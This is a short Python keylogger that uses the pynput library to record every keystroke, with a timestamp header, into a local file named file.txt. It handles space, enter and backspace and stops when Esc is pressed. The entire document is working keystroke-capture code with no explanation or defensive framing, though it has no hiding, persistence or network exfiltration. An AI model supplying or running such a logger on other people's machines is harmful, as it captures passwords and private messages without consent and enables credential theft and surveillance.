from pynput import keyboard
import datetime

# Record the date and time in the file
with open("./file.txt", "a") as file:
    current_datetime = datetime\
                        .datetime\
                        .now()\
                        .strftime("%d/%b/%Y, %I:%M %p")
    file.write(f"\n\n{current_datetime}\n")


def on_press(key):
        try:
            with open("./file.txt", "a") as output_file:
                if key == keyboard.Key.space:
                    output_file.write(" ")
                elif key == keyboard.Key.enter:
                    output_file.write("\n")
                else:
                    output_file.write(key.char)
        except AttributeError:
            if key == keyboard.Key.backspace:
                with open("./file.txt", "r") as output_file:
                    data = output_file.read()
                with open("./file.txt", "w") as output_file:
                    output_file.write(data[:-1])
            elif key == keyboard.Key.esc:
                # Stop listener
                return False

# Collect events until released
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()